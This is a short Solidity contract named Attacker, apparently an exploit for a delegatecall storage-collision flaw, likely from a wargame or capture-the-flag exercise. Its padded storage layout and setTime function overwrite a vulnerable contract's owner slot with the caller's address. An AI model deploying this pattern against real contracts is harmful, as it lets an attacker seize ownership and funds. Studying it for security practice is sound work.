// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

contract Attacker {
    address public temporary1;
    address public temporary2;
    address public owner;
    
    function setTime(uint256) public {
        owner = tx.origin;
    }

    function getOwner() public view returns (address) {
        return owner;
    }
}